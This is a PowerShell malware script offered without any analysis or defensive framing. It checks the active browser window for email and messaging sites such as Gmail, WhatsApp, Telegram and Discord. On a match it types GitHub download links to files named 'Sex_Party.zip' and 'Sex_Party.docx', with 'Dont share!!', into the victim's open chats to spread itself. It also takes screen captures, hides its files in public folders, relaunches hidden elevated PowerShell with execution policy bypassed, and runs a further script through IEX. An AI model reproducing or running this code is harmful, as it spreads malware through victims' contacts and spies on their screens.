﻿
#cmd /c "mkdir %random%.%random%.%random%.%random%"
#exit

#___________________________________________________

$Pbc = "C:\Users\Public\Windows"; $Pbv = "C:\Users\Public\Videos"
$Pbr = "C:\Users\Public\Recorded TV"; $Pbp = "$home\Pictures"

#___________________________________________________

function Pdq-Naivas
{
	if (!(Test-Path $global:Pb))
	{
		New-Item -Path $global:Pb -ItemType Directory
	}
	else
	{
		echo GoodlifePharmacy!
	}
}

$global:Pb = $Pbc; Pdq-Naivas; $global:Pb = $Pbv; Pdq-Naivas
$global:Pb = $Pbr; Pdq-Naivas; $global:Pb = $Pbp; Pdq-Naivas

Set-Location -Path $Pbc

#___________________________________________________

function Garuda-Indonesia
{
	Remove-Item $Pbc\title.txt
	$ProcessActive = Get-Process chrome -ErrorAction SilentlyContinue
	if($ProcessActive -eq $null) 
	{ 
		$ProcessActive = Get-Process firefox -ErrorAction SilentlyContinue
		if($ProcessActive -eq $null) 
		{
			$ProcessActive = Get-Process opera -ErrorAction SilentlyContinue
			if($ProcessActive -eq $null) 
			{
				exit
			}
			else
			{ 
				$global:brs = "opera"
				Get-Process opera |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
			}
		}
		else
		{
			$global:brs = "firefox"
			Get-Process firefox |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
		}
	} 
	else
	{
		$global:brs = "chrome"
		Get-Process chrome |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
	}

	Get-Content $Pbc\title.txt | Select-Object -Skip 3 | Out-File $Pbc\title2.txt
	Remove-Item $Pbc\title.txt
	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
	$title = $title.Trim()
	$title > $Pbc\title.txt
	Remove-Item $Pbc\title2.txt
	
	Copy-Item $Pbc\title.txt -Destination $Pbr -recurse

	$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
	Start-Sleep -s 1
	$txt = "$Pbr\title.txt"
	Rename-Item "$Pbr\title.txt" "z.$timestamp.txt"
}

Garuda-Indonesia

#___________________________________________________

$wshell = New-Object -ComObject wscript.shell;
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SFW {
 [DllImport("user32.dll")]
 [return: MarshalAs(UnmanagedType.Bool)]
 public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@
$fw =  (get-process $global:brs).MainWindowHandle

#___________________________________________________

function Mary-Gray
{
	$file = "$Pbc\title.txt"
	$title = [IO.File]::ReadAllText("$file")
	$string = $title
	if ($string -like "*$unique*") 
	{
		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Sex_Party.zip')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
		Start-Sleep -s 1
		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Sex_Party.docx')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
		Start-Sleep -s 1
		$wshell.SendKeys('Dont share!!')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
		$wshell.SendKeys('{ENTER}'); $wshell.SendKeys('{ENTER}')

		 #___________________________________________________

		Start-Sleep -s 2
		function Mage-Lo
		{
			$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height) 
			Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
		}

		Braeside-Catering

		$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
		Start-Sleep -s 1
		$png = ".\text.png"
		Rename-Item "$png" "z.$timestamp.png"

		Copy-Item $pwd\*.png -Destination $Pbr -recurse
		Remove-Item $pwd\*.png


	}
	else
	{
		echo $unique
	}
}

#___________________________________________________

$unique = "facebook"; Mary-Gray
$unique = "gmail"; Mary-Gray
$unique = "yahoo"; Mary-Gray
$unique = "whatsapp"; Mary-Gray
$unique = "x.com"; Mary-Gray
$unique = "telegram"; Mary-Gray
$unique = "snapchat"; Mary-Gray
$unique = "instagram"; Mary-Gray
$unique = "proton"; Mary-Gray
$unique = "yandex"; Mary-Gray
$unique = "discord"; Mary-Gray
$unique = "twitch"; Mary-Gray


#___________________________________________________

function Mage-Lo
{
	echo GoodlifePharmacy!
}

#___________________________________________________

function Braeside-Catering
{
	param(
	  [string]$Width,
	  [string]$Height,
	  [String]$FileName = "Screenshot"
	 
	)
	 
	function Take-Screenshot{
	[cmdletbinding()]
	param(
	 [Drawing.Rectangle]$bounds,
	 [string]$path
	)
		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
		$graphics = [Drawing.Graphics]::FromImage($bmp)
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
		$bmp.Save($path)
		$graphics.Dispose()
		$bmp.Dispose()
	}
	 
	function Get-ScreenResolution {
		$Screens = [system.windows.forms.screen]::AllScreens
		foreach ($Screen in $Screens) {
			$DeviceName = $Screen.DeviceName
			$Width  = $Screen.Bounds.Width
			$Height  = $Screen.Bounds.Height
			$IsPrimary = $Screen.Primary
			$OutputObj = New-Object -TypeName PSobject
			$OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
			$OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
			$OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
			$OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
			$OutputObj
		}
	}

	$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm-ss")
	$FileName = "{0}-{1}" -f $FileName, $datetime
	$Filepath = join-path $env:temp $FileName
	 
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")

	if(!($width -and $height)) { 
		$screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
		$Width = $screen.Width
		$Height = $screen.height
	}
	Mage-Lo
}

#___________________________________________________

Start-Sleep -s 2
function Mage-Lo
{
	$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height) 
	Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
}

Braeside-Catering

$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
Start-Sleep -s 1
$png = ".\text.png"
Rename-Item "$png" "z.$timestamp.png"

Copy-Item $pwd\*.png -Destination $Pbr -recurse
Remove-Item $pwd\*.png

#___________________________________________________

Set-Location -Path $Pbc
cmd /c "mkdir %random%.%random%.%random%.%random%"

#___________________________________________________

Start-Process powershell.exe -Verb runAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '$Pbc/System.ps1'"

#___________________________________________________

Start-Sleep -s 700
IEX ".\Carrefour.ps1"

#___________________________________________________


